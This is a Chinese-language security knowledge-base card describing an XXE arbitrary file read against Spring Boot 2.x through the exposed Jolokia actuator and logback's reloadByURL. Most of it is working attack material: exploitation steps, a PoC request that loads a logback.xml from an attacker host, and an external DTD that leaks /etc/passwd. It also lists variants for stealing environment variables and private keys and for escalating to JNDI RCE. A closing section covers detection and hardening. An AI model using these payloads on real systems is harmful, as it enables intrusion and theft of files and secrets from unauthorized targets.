---
id: web-java-framework-spring-actuator-jolokia-logback-reloadbyurl-xxe-file-read
title: Spring Boot Actuator Jolokia 调 logback JMXConfigurator#reloadByURL：远程 XML 外部实体 XXE 任意文件读取
type: scenario
domain: web
path: web/java/framework/spring
technique: actuator-jolokia-logback-reloadbyurl-xxe-file-read
tags:
- java
- spring
- spring-boot
- actuator
- jolokia
- logback
- xxe
- file-read
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: Spring Boot 2.x（原文标注）
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:34:07+08:00'
  notes: 已对照原文与图10/11核对：reloadByURL 加载恶意 logback.xml + 外部 DTD file:///etc/passwd，MalformedURLException 栈中回显 /etc/passwd 与原文一致；affected_versions Spring Boot 2.x 为原文标注；未复跑。
url: /docs/web/java/framework/spring/web-java-framework-spring-actuator-jolokia-logback-reloadbyurl-xxe-file-read/
draft: false
kb_aliases:
- logback reloadByURL XXE
- jolokia XXE
- logback.xml 外部实体
- Actuator 任意文件读取
- insertFromJNDI 之外的外部实体
---

## 一句话结论

当 Spring Boot 2.x 应用的 Jolokia 端点未授权暴露、classpath 有 logback 时，攻击者可通过 `/jolokia/list` 找到 `ch.qos.logback.classic.jmx.JMXConfigurator` 的 `reloadByURL`，让它加载攻击者托管的 `logback.xml`；XML 中的外部 DTD/参数实体指向 `file:///etc/passwd`，解析报错会把文件内容带进响应，形成任意文件读取。

## 原理

- Jolokia 将 logback 的 `JMXConfigurator` 暴露为 `ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator`，其 `reloadByURL(java.net.URL)` 支持从任意 URL 重新加载 logback 配置。
- logback 配置是 XML，解析器会处理 `DOCTYPE` 与实体声明。攻击者在自己的 HTTP 服务上放置恶意 `logback.xml`：

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://attacker:4444/xxe.dtd">%remote;%int;]>
<a>&trick;</a>
```

- 外层 XML 先加载攻击者 DTD；DTD 中 `<!ENTITY % d SYSTEM "file:///etc/passwd">` 定义文件实体，`<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">` 则把 `/etc/passwd` 的内容拼进 `trick` 实体的 SYSTEM 字面量。解析 `<a>&trick;</a>` 时，解析器尝试把 `:root:x:0:0:...` 当 URL，抛出 `MalformedURLException`/`XMLStreamException`，异常信息里带有该字面量，从而把文件内容回显到响应或错误页。
- 原文标注影响 Spring Boot 2.x；是否可利用取决于 logback 版本与 XML 解析器是否默认解析外部实体/DTD（部分 logback 配置会禁用外部实体，实际测试以回显为准）。
- Jolokia 的调用路径中 `/` 用 `!` 转义：`reloadByURL/http:!/!/attacker:4444!/logback.xml` 还原为 `http://attacker:4444/logback.xml`。

## 触发条件

- Spring Boot 2.x 应用暴露 `/jolokia` 或 `/actuator/jolokia`，且未授权可访问。
- classpath 有 logback，`/jolokia/list` 中存在 `JMXConfigurator` 的 `reloadByURL` 操作。
- 目标能出站访问攻击者 HTTP 服务。
- logback 的 XML 解析器允许外部 DTD/实体解析（或目标版本未禁用）。

## 利用步骤

1. 访问 `/jolokia/list` 或 `/actuator/jolokia/list`，搜索 `ch.qos.logback.classic` 与 `reloadByURL`。
2. 在攻击机准备 `logback.xml` 与 `xxe.dtd`，启动 HTTP 服务（如 4444 端口）。
3. 请求 `reloadByURL` 让目标加载 `logback.xml`；目标解析外部 DTD，读取 `/etc/passwd` 并把内容带入异常。
4. 观察 Jolokia 响应/错误页中的文件内容；若被截断，改用其他文件（配置、密钥、`/proc/self/environ`）或换实体技巧。
5. 若外部实体被禁用，可换用 `insertFromJNDI` 走 JNDI（见关联卡），或寻找 logback 其他可从 URL 加载的解析入口。

## PoC

```http
GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker:4444!/logback.xml HTTP/1.1
Host: target:8080
```

`logback.xml`：

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://attacker:4444/xxe.dtd">%remote;%int;]>
<a>&trick;</a>
```

`xxe.dtd`：

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
```

## 变体与关联

- 变体：读取其他文件（`file:///proc/self/environ`、应用配置、私钥），或把 `%d` 放进属性值以避开异常截断。
- 变体：用 `insertFromJNDI` 把同一份恶意 XML 转成 JNDI RCE（见关联卡）。
- 关联：[[web-java-framework-spring-actuator-jolokia-logback-reloadbyurl-jndi-rce]]（同一 `reloadByURL` 入口，sink 换成 JNDI 命令执行）、[[web-java-framework-spring-actuator-restart-logging-config-logback-jndi-rce]]（同一 logback XML 加载能力，入口换成 `logging.config` + `/restart`）。
- 边界：Jolokia 被鉴权/关闭、logback 的 XML 解析禁用外部实体、目标不能出站或 `reloadByURL` 被移除时，该链不成立。

## 检测与防御

- 检测：`/jolokia/exec` 出现 `logback`、`JMXConfigurator`、`reloadByURL`、`http:!/!`；目标请求外部 `.dtd`/`.xml`；响应或日志出现 `MalformedURLException`、`XMLStreamException` 且带系统文件内容。
- 防御：关闭或鉴权 Jolokia，限制 MBean 操作白名单；升级 logback 并禁用 XML 外部实体/DTD（`disallow-doctype-decl`、关闭外部通用/参数实体）。
- 防御：logback 配置只从本地受控路径加载，禁止 `reloadByURL` 指向外部地址；限制应用出站访问。
- 加固：Actuator/Jolokia 仅绑内网或独立管理端口，加认证与审计。
